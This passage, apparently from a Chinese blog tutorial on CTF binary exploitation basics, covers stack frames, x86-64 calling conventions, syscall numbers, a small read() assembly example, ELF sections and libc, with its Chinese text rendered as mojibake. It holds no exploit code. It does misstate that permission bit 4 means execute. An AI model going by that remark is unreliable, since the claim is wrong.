&lt;p&gt;ä»¥æ­¤ç±»æ¨ï¼Œfunc_bæ‰§è¡Œå®Œæ¯•è¿”å›åï¼Œæ ˆå¸ƒå±€å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/5.png&#34;
	width=&#34;455&#34;
	height=&#34;785&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/5_hu_99c9a90146c07cce.png 480w, https://expl0rer.top/p/pwn-1/5_hu_929fb098a281dce3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;57&#34;
		data-flex-basis=&#34;139px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è¿™ä¹‹åï¼Œmainå‡½æ•°ç»§ç»­æ‰§è¡Œæ­¤æ—¶å¸ƒå±€å˜å›å¼€å§‹æ‰§è¡Œç¨‹åºæ—¶çš„æ ˆå¸ƒå±€ï¼Œç›´åˆ°ç»“æŸã€‚è‡³æ­¤ï¼Œå‡½æ•°çš„è°ƒç”¨è¿”å›æ‰§è¡Œæµç¨‹ç»“æŸã€‚&lt;/p&gt;
&lt;p&gt;æ€»ç»“ï¼š&lt;/p&gt;
&lt;p&gt;è°ƒç”¨å‡½æ•°ï¼šåªéœ€è¦å°†ripå‹æ ˆï¼ˆä¿å­˜åˆ°å½“å‰æ ˆå¸§ï¼‰ï¼Œå³push ripï¼Œç„¶åè®²ripèµ‹å€¼ä¸ºè¢«è°ƒç”¨å‡½æ•°çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸€æ“ä½œè¢«&lt;em&gt;éšæ€§çš„å†…ç½®åœ¨callæŒ‡ä»¤ä¸­&lt;/em&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¢«è°ƒç”¨å‡½æ•°ï¼špush rbpï¼›mov rbp rspï¼› sub rsp 0xxxxã€‚å³ä¿å­˜è°ƒç”¨å‡½æ•°çš„rbpæŒ‡é’ˆï¼Œå°†è‡ªå·±çš„rbpæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç„¶åå¼€è¾Ÿæ ˆç©ºé—´ç»™è‡ªå·±ç”¨ï¼Œæ­¤æ—¶rbpå°±å˜æˆäº†è¢«è°ƒç”¨å‡½æ•°çš„æ ˆåº•ã€‚&lt;/p&gt;
&lt;p&gt;å‡½æ•°è¿”å›ï¼šleaveï¼›retï¼›ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šmov rsp rbpï¼›pop rbpï¼›pop ripï¼›å³æ¢å¤æ ˆå¸§,è¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰ä¸ªç–‘é—®ï¼Œä¸ºä»€ä¹ˆåœ¨è°ƒç”¨è¿‡ç¨‹ç§ï¼Œå¯„å­˜å™¨rspè¿™ç±»ä¼šå‡ºç°å¾ˆå¤šçš„èµ‹å€¼æ“ä½œï¼Œæ¯”å¦‚ä¸Šè¿°çš„â€œmov rsp rbpï¼›pop rbpï¼›pop ripâ€ï¼Œrspæ›´åƒæ˜¯ä¸€ä¸ªä¸­é—´å˜é‡ï¼Œä¸€ç›´å˜åŒ–ã€‚å…¶å®è¿™æ˜¯æœ‰åŸå› çš„ã€‚&lt;/p&gt;
&lt;p&gt;rsp çœ‹ä¼¼åŠ¨æ€å˜åŒ–ï¼Œä½†å®ƒçš„å˜åŒ–æ˜¯å®Œå…¨éµå¾ªæ ˆæ“ä½œçš„é€»è¾‘å’Œå‡½æ•°è°ƒç”¨çº¦å®šçš„ã€‚æ ˆæ˜¯ä¸€ç§åè¿›å…ˆå‡ºçš„æ•°æ®ç»“æ„ï¼Œåœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œå‚æ•°å…¥æ ˆã€å±€éƒ¨å˜é‡åˆ†é…å†…å­˜ï¼ˆé€šè¿‡è°ƒæ•´ rsp æ¥å®ç°ï¼‰ã€ä¿å­˜å¯„å­˜å™¨å€¼ç­‰æ“ä½œï¼Œéƒ½éœ€è¦é€šè¿‡ä¿®æ”¹ rsp çš„å€¼æ¥æ”¹å˜æ ˆé¡¶ä½ç½®ï¼Œä»¥å®Œæˆå¯¹æ ˆå†…å­˜çš„åˆç†ä½¿ç”¨å’Œç®¡ç† ã€‚è€Œåœ¨å‡½æ•°è¿”å›é˜¶æ®µï¼Œåˆè¦é€šè¿‡è°ƒæ•´ rsp æ¥æ¢å¤ä¹‹å‰çš„æ ˆçŠ¶æ€ï¼Œé‡Šæ”¾å½“å‰å‡½æ•°å ç”¨çš„æ ˆç©ºé—´ã€‚&lt;/p&gt;
&lt;p&gt;è€Œrbp æ˜ç¡®åˆ’åˆ†äº†å½“å‰å‡½æ•°æ ˆå¸§çš„èŒƒå›´ï¼šä» rbpï¼ˆåº•éƒ¨ï¼‰åˆ° rspï¼ˆé¡¶éƒ¨ï¼‰ä¹‹é—´çš„å†…å­˜åŒºåŸŸï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªå›ºå®šçš„æç‚¹ï¼Œæ•°å€¼ä¸å˜ä¾é rspå˜åŒ–æ¥å®Œæˆæ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ï¼Œè¿™äº›å¯„å­˜å™¨çš„èµ‹å€¼æ“ä½œéƒ½æ˜¯ä¸ºäº†ä¸¥æ ¼æŒ‰ç…§è®¡ç®—æœºä½“ç³»ç»“æ„å’Œç¼–ç¨‹è¯­è¨€çš„å‡½æ•°è°ƒç”¨è§„èŒƒï¼Œå®ç°å‡½æ•°è°ƒç”¨ã€æ‰§è¡Œå’Œè¿”å›è¿‡ç¨‹ä¸­çš„å†…å­˜ç®¡ç†ã€æ•°æ®ä¿æŠ¤ä»¥åŠç¨‹åºæ‰§è¡Œæµçš„æ­£ç¡®æ§åˆ¶ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;ç®€å•è¯´ï¼Œ&lt;code&gt;rsp&lt;/code&gt; æ˜¯ â€œåŠ¨æ€å˜åŒ–çš„æ ˆé¡¶æŒ‡é’ˆâ€ï¼Œè€Œ &lt;code&gt;rbp&lt;/code&gt; æ˜¯ â€œå›ºå®šä¸åŠ¨çš„æ ˆå¸§åŸºå‡†â€â€”â€” å‰è€…è´Ÿè´£ç®¡ç†æ ˆçš„å®æ—¶çŠ¶æ€ï¼Œåè€…è´Ÿè´£é”šå®šå½“å‰æ ˆå¸§çš„ä½ç½®å’ŒèŒƒå›´ã€æ ˆå¸§çš„å±€éƒ¨å˜é‡ï¼ŒäºŒè€…é…åˆå®ç°äº†å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­å†…å­˜çš„æœ‰åºç®¡ç†ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;è°ƒç”¨çº¦å®š-1&#34;&gt;è°ƒç”¨çº¦å®š
&lt;/h3&gt;&lt;p&gt;è¿”å›å€¼ï¼šä¸€èˆ¬æ¥è¯´,ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ä¼šå­˜å‚¨åˆ°RAXå¯„å­˜å™¨ã€‚
X86-64å‡½æ•°çš„è°ƒç”¨çº¦å®šä¸ºï¼š&lt;/p&gt;
&lt;p&gt;ä»å·¦è‡³å³å‚æ•°ä¸€æ¬¡ä¼ é€’ç»™rdiã€rsiã€rdxã€rcxã€r8ã€r9ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœä¸€ä¸ªå‡½æ•°çš„å‚æ•°å¤šäº6ä¸ªï¼Œå°±ä¸åœ¨å¯„å­˜å™¨ä¼ å‚äº†ï¼Œè€Œæ˜¯ä»å³è‡³å·¦å‹å…¥æ ˆä¸­ä¼ é€’ã€‚&lt;/p&gt;
&lt;p&gt;ä½œç”¨æ˜¯ç»´æŠ¤æ ˆå¸§ï¼Œé€šå¸¸å‡ºç°åœ¨å‡½æ•°çš„ç»“å°¾ï¼Œä¸retï¼ˆreturnï¼‰è¿ç”¨ã€‚å…¶å®é™…ä½œç”¨ä¸ºï¼šmov rsp rbpï¼›pop rbpï¼›å³ï¼šå°†æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘æ ˆå¸§çš„åº•éƒ¨ã€ç„¶ååœ¨æ ˆä¸­å¼¹å‡ºæ–°çš„æ ˆåº•æŒ‡é’ˆã€‚&lt;/p&gt;
&lt;h4 id=&#34;ç³»ç»Ÿè°ƒç”¨&#34;&gt;ç³»ç»Ÿè°ƒç”¨
&lt;/h4&gt;&lt;p&gt;syscallæŒ‡ä»¤ï¼Œç”¨äºè°ƒç”¨ç³»ç»Ÿå‡½æ•°ï¼Œè°ƒç”¨æ—¶éœ€è¦æŒ‡æ˜&lt;strong&gt;ç³»ç»Ÿè°ƒç”¨å·ç &lt;/strong&gt;ã€‚ç³»ç»Ÿè°ƒç”¨å·å­˜åœ¨ rax å¯„å­˜å™¨ä¸­ï¼Œç„¶åå¸ƒç½®å¥½å‚æ•°ï¼Œæ‰§è¡Œsyscallå³å¯ã€‚&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;è°ƒç”¨å·ç &lt;/th&gt;
          &lt;th&gt;åç§°&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;read&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;write&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;open&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;close&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;9&lt;/td&gt;
          &lt;td&gt;mmap&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;37&lt;/td&gt;
          &lt;td&gt;alarm&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;60&lt;/td&gt;
          &lt;td&gt;exit&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;62&lt;/td&gt;
          &lt;td&gt;kill&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;59&lt;/td&gt;
          &lt;td&gt;execv&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;è¿˜æœ‰ä¸€äº›è°ƒç”¨å·ç æ²¡åˆ—å‡ºæ¥ï¼Œå…¶å®ä¸Šç½‘æŸ¥ä¸€æŸ¥å°±è¡Œï¼Œè¿™ä¸œè¥¿ç”¨å¤šäº†å°±è®°ä½äº†ï¼Œå‰æœŸä¸ç”¨åˆ»æ„æ­»è®°ç¡¬èƒŒçš„ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°è¿™é‡Œï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œçœ‹è¿‡ã€Šç¬¬ä¸€é˜¶æ®µã€‹çš„æ“ä½œç³»ç»Ÿç« èŠ‚å°±çŸ¥é“ï¼Œæœ‰chmod 777 &amp;lt;æ–‡ä»¶&amp;gt;ï¼šè®¾å®šæ–‡ä»¶ä½¿ç”¨æƒé™çš„æŒ‡ä»¤ã€‚æ­£å¥½å°±æ˜¯1+2+4ï¼Œ4ä»£è¡¨æ˜¯xæ‰§è¡Œæƒé™ï¼Œè¿™é‡Œè¡¨æ ¼æ²¡å†™å‡ºæ¥ã€‚æ‰€ä»¥å…¥é—¨pwnæˆ‘å°±å»ºè®®å¤§å®¶å»å­¦é‚£ä¸ªLinuxæ“ä½œç³»ç»Ÿï¼ŒåŸºç¡€è¿‡ä¸€ä¸‹ï¼Œä¸ç”¨ç²¾é€šï¼Œä¸ç„¶ä½ å¼ºè¡Œå…¥é—¨PWNå¾ˆæ‡µçš„ã€‚&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼šè°ƒç”¨read(0,buf,size)ï¼š&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;ä»å·¦è‡³å³å‚æ•°ä¸€æ¬¡ä¼ é€’ç»™rdiã€rsiã€rdxã€rcxã€r8ã€r9&lt;/strong&gt;&lt;/em&gt;ï¼ˆå¯„å­˜å™¨ï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;     read&amp;#39;s syscall number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdi&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;     first arg&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsi&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;   second arg&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;si&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ze&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;  third ard&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;       execute read(0,buf,size);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;elfæ–‡ä»¶&#34;&gt;ELFæ–‡ä»¶
&lt;/h2&gt;&lt;h3 id=&#34;elf&#34;&gt;elf
&lt;/h3&gt;&lt;p&gt;linuxç¯å¢ƒä¸­ï¼Œ&lt;strong&gt;äºŒè¿›åˆ¶å¯æŒæ€§æ–‡ä»¶&lt;/strong&gt;çš„ç±»å‹æ˜¯ELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;elfæ–‡ä»¶çš„æ ¼å¼æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£çš„å°±æ˜¯elfæ–‡ä»¶ä¸­çš„å„ä¸ªèŠ‚ã€æ®µç­‰æ¦‚å¿µã€‚elfçš„åŸºæœ¬ä¿¡æ¯å­˜åœ¨äºelfçš„å¤´éƒ¨ä¿¡æ¯ä¸­ï¼Œè¿™äº›ä¿¡æ¯åŒ…æ‹¬æŒ‡ä»¤çš„è¿è¡Œæ¶æ„ã€ç¨‹åºå…¥å£ç­‰å†…å®¹ï¼Œå¯ä»¥é€šè¿‡readelf -h &amp;lt;elf_name&amp;gt;æ¥æŸ¥çœ‹å¤´éƒ¨ä¿¡æ¯ï¼Œå½“ç„¶æ‰“è¿‡CTF-MISCçš„çŸ¥é“çš„è¯ä¼°è®¡ä¼šå»ç”¨010editorï¼Œéƒ½å¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/6.png&#34;
	width=&#34;610&#34;
	height=&#34;180&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/6_hu_4aa131809ccbce34.png 480w, https://expl0rer.top/p/pwn-1/6_hu_66c842a6c402488c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;338&#34;
		data-flex-basis=&#34;813px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/7.png&#34;
	width=&#34;1221&#34;
	height=&#34;659&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/7_hu_f82dfb9f0e6af09c.png 480w, https://expl0rer.top/p/pwn-1/7_hu_c803067fc21ccd19.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Magicå¤´éƒ¨æ–‡ä»¶&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;185&#34;
		data-flex-basis=&#34;444px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/8.png&#34;
	width=&#34;858&#34;
	height=&#34;305&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/8_hu_ebcc70c8d17b8d76.png 480w, https://expl0rer.top/p/pwn-1/8_hu_d91de4a5ee068c7b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;281&#34;
		data-flex-basis=&#34;675px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒç¬¬ä¸‰å¼ å›¾å°±æ˜¯ELFæ–‡ä»¶äº†ï¼Œè¿™ç§æ–‡ä»¶å¹¶ä¸æ˜¯å¸¸è§„çš„ZIPè¿™äº›å™¢ã€‚&lt;/p&gt;
&lt;p&gt;elfæ–‡ä»¶ä¸­åŒ…å«è®¸å¤šä¸ªèŠ‚ï¼ˆsectionï¼‰ï¼Œå„ä¸ªèŠ‚ä¸­å­˜æ”¾ä¸åŒçš„æ•°æ®ï¼Œè¿™äº›èŠ‚çš„ä¿¡æ¯å­˜æ”¾åœ¨èŠ‚å¤´è¡¨ä¸­ï¼Œreadelf -S &amp;lt;file&amp;gt;æŸ¥çœ‹ï¼Œè¿™äº›èŠ‚ä¸»è¦åŒ…æ‹¬ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;åç§°&lt;/th&gt;
          &lt;th&gt;ä½œç”¨&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;.text&lt;/td&gt;
          &lt;td&gt;å­˜æ”¾ç¨‹åºè¿è¡Œçš„ä»£ç &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.rdata&lt;/td&gt;
          &lt;td&gt;å­˜æ”¾ä¸€äº›å¦‚å­—ç¬¦ä¸²ç­‰ä¸å¯ä¿®æ”¹çš„æ•°æ®&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.data&lt;/td&gt;
          &lt;td&gt;å­˜æ”¾&lt;em&gt;å·²ç»åˆå§‹åŒ–&lt;/em&gt;çš„å¯ä¿®æ”¹çš„æ•°æ®&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.bss&lt;/td&gt;
          &lt;td&gt;å­˜æ”¾&lt;em&gt;æœªè¢«åˆå§‹åŒ–&lt;/em&gt;çš„ç¨‹åºå¯ä¿®æ”¹çš„æ•°æ®&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.plt ä¸ .got&lt;/td&gt;
          &lt;td&gt;ç¨‹åºåŠ¨æ€é“¾æ¥å‡½æ•°åœ°å€&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;elfæ–‡ä»¶ä¸æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å¸¸è§„æ–‡ä»¶ï¼Œä¸åœ¨æˆ‘ä»¬çš„ç”µè„‘æ¡Œé¢ä¸Šï¼Œè€Œæ˜¯å­˜åœ¨ç£ç›˜æ–‡ä»¶é‡Œï¼Œå®ƒæœ¬è´¨ä¸Šæ˜¯å­˜å‚¨åœ¨ç£ç›˜ï¼ˆç¡¬ç›˜ã€SSD ç­‰ï¼‰ä¸Šçš„ â€œå¸¸è§„æ–‡ä»¶â€ï¼Œè¿è¡Œç¨‹åºæ—¶ï¼Œè¿™ä¸ªç¨‹åºçš„elfæ–‡ä»¶æ‰ä¼šåŠ è½½åˆ°å†…å­˜é‡Œï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„&lt;strong&gt;è¿è¡Œå†…å­˜&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;elfæ–‡ä»¶åœ¨åŠ è½½è¿›å…¥å†…å­˜æ—¶ï¼š
elfæ–‡ä»¶çš„èŠ‚ï¼ˆsectionï¼‰ä¼šè¢«æ˜ å°„è¿›å†…å­˜ä¸­çš„æ®µï¼ˆsegmentï¼‰ï¼Œè€Œè¿™ä¸€æ˜ å°„è¿‡ç¨‹éµå¾ªçš„æœºåˆ¶æ˜¯æ ¹æ®å„ä¸ªèŠ‚çš„æƒé™æ¥è¿›è¡Œæ˜ å°„çš„ã€‚&lt;/p&gt;
&lt;p&gt;æ¢å¥è¯è¯´ï¼Œå¯è¯»å¯å†™çš„èŠ‚è¢«æ˜ å°„å…¥ä¸€ä¸ªæ®µï¼Œåªè¯»çš„èŠ‚è¢«æ˜ å°„å…¥ä¸€ä¸ªæ®µã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/9.png&#34;
	width=&#34;1100&#34;
	height=&#34;560&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/9_hu_6bae07d610db5804.png 480w, https://expl0rer.top/p/pwn-1/9_hu_66c8193d78b0595a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;196&#34;
		data-flex-basis=&#34;471px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å•ä¸ªelfæ–‡ä»¶å†…éƒ¨å¤šä¸ªèŠ‚è¢«åˆå¹¶æ˜ å°„å…¥ä¸€ä¸ªæ®µï¼Œæ­¤æ—¶å°±æ ‡å¿—ç€elfæ–‡ä»¶è¢«å¯åŠ¨è¿è¡Œäº†ã€‚&lt;/p&gt;
&lt;p&gt;æ ¹æ®ä¸Šè¿°è®²è§£ï¼Œå¯ä»¥çŸ¥é“ELFæ–‡ä»¶ä»¥ä¸¤ç§çŠ¶æ€å­˜åœ¨ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;çŠ¶æ€&lt;/th&gt;
          &lt;th&gt;å­˜å‚¨ä½ç½®&lt;/th&gt;
          &lt;th&gt;ç”¨é€”&lt;/th&gt;
          &lt;th&gt;èƒ½å¦è¢«CPUç›´æ¥æ‰§è¡Œ&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;æœªè¿è¡Œæ—¶&lt;/td&gt;
          &lt;td&gt;ç£ç›˜&lt;/td&gt;
          &lt;td&gt;ä¿å­˜ç¨‹åºçš„æŒ‡ä»¤å’Œæ•°æ®ï¼ˆé™æ€æ–‡ä»¶ï¼‰&lt;/td&gt;
          &lt;td&gt;ä¸èƒ½ï¼ˆCPUåªè®¤è¯†å†…å­˜æ•°æ®ï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;è¿è¡Œæ—¶&lt;/td&gt;
          &lt;td&gt;è¿è¡Œå†…å­˜&lt;/td&gt;
          &lt;td&gt;CPUä»å†…å­˜è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œ&lt;/td&gt;
          &lt;td&gt;èƒ½&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;In other wordsï¼ŒELF æ–‡ä»¶æ˜¯ â€œç¨‹åºçš„é™æ€è½½ä½“â€ï¼ˆå­˜ç£ç›˜ï¼‰ï¼Œç¡®ä¿ç¨‹åºèƒ½ä»æºä»£ç æ­£ç¡®è½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶åœ¨å†…å­˜ä¸­è¢«æ­£ç¡®åŠ è½½å’Œè¿è¡Œã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;libc&#34;&gt;libc
&lt;/h3&gt;&lt;p&gt;ä»€ä¹ˆæ˜¯libc?&lt;/p&gt;
&lt;p&gt;glibcæ˜¯linuxä¸‹é¢Cæ ‡å‡†åº“çš„å®ç°ï¼Œå…¨ç§°GNU C Libraryã€‚&lt;/p&gt;
&lt;p&gt;glibcæœ¬èº«æ˜¯GNUæ——ä¸‹çš„Cæ ‡å‡†åº“ï¼Œåæ¥é€æ¸æˆä¸ºäº†Linuxçš„æ ‡å‡†Cåº“ï¼Œè€ŒLinuxä¸‹åŸæ¥çš„æ ‡å‡†Cåº“Linux libcé€æ¸ä¸å†è¢«ç»´æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;Linuxä¸‹é¢çš„æ ‡å‡†Cåº“ä¸ä»…æœ‰è¿™ä¸€ä¸ªï¼Œå¦‚uclibcã€klibcï¼Œä»¥åŠä¸Šé¢è¢«æåˆ°çš„Linux libcï¼Œä½†æ˜¯glibcæ— ç–‘æ˜¯ç”¨å¾—æœ€å¤šçš„ã€‚glibcåœ¨/libç›®å½•ä¸‹çš„.soæ–‡ä»¶ä¸º&lt;strong&gt;libc.so.6&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ç­‰ç­‰&amp;hellip;&amp;hellip;soåç¼€ï¼Ÿï¼Ÿ.soæ—¶å•¥æ–‡ä»¶ï¼Œæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸ªelfæ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/10.png&#34;
	width=&#34;1219&#34;
	height=&#34;70&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/10_hu_4c2c3ddbfb8ccae1.png 480w, https://expl0rer.top/p/pwn-1/10_hu_98caa8be48b8098e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;åœ¨Ubuntuä¸Šçš„soæ–‡ä»¶&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1741&#34;
		data-flex-basis=&#34;4179px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é€šå¸¸.soç”¨./çš„æŒ‡ä»¤è¿è¡Œåä¼šç»™å‡ºç‰ˆæœ¬ä¿¡æ¯ï¼Œå½“ç„¶ï¼Œç”¨fileå‘½ä»¤ä¹Ÿæ˜¯å¯ä»¥çš„:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/11.png&#34;
	width=&#34;1676&#34;
	height=&#34;190&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/11_hu_adb8a45b71a6e24d.png 480w, https://expl0rer.top/p/pwn-1/11_hu_c64d7e55efbc73c3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;libc.soæ–‡ä»¶ç‰ˆæœ¬ä¿¡æ¯&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;882&#34;
		data-flex-basis=&#34;2117px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;LinuxåŸºæœ¬ä¸Šæ‰€æœ‰çš„ç¨‹åºéƒ½ä¾èµ–libcï¼Œæ‰€ä»¥libcä¸­çš„å‡½æ•°è‡³å…³é‡è¦ã€‚å½“ç„¶CTFpwnä¹Ÿç¦»ä¸å¼€libcï¼šIDAåˆ†ælibcã€æºç ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
